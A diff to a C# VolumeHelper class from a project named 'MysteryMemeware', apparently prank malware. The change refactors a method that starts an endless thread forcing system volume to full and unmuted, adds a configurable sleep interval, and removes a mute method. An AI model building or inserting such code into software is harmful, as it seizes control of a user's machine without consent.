@@ -1,30 +1,43 @@
-﻿//#approve 08/05/2022 12:52pm
-using System;
+﻿using System;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
 using System.Threading;
-namespace MysteryMemeware
+namespace MysteryMemeware.Helpers
 {
     public static class VolumeHelper
     {
-        public static Thread LockAtFull()
+        public static Thread LockAtFull(int sleepTime = 500)
         {
-            Thread volumeLockThread = new Thread(() =>
+            if(sleepTime < 0)
             {
-                while (true)
+                throw new Exception("sleepTime must be greater than or equal to 0.");
+            }
+            Thread output;
+            if (sleepTime is 0)
+            {
+                output = new Thread(() =>
                 {
-                    SetVolume(1.0f);
-                    SetMute(false);
-                    Thread.Sleep(100);
-                }
-            });
-            volumeLockThread.Start();
-            return volumeLockThread;
-        }
-        public static void FullMute()
-        {
-            SetVolume(0.0f);
-            SetMute(true);
+                    while (true)
+                    {
+                        SetVolume(1.0f);
+                        SetMute(false);
+                    }
+                });
+            }
+            else
+            {
+                output = new Thread(() =>
+                {
+                    while (true)
+                    {
+                        SetVolume(1.0f);
+                        SetMute(false);
+                        Thread.Sleep(sleepTime);
+                    }
+                });
+            }
+            output.Start();
+            return output;
         }
         public static float GetVolume()
         {
@@ -77,7 +90,7 @@ namespace MysteryMemeware
             SetVolume(volumeLevel);
             SetMute(muteState);
         }
-        //Internals
+        #region Pinvoke Calls
         [Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
         private interface IAudioEndpointVolume
         {
@@ -121,5 +134,6 @@ namespace MysteryMemeware
         }
         [DllImport("user32.dll")]
         private static extern IntPtr SendMessageW(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);
+        #endregion
     }
 }
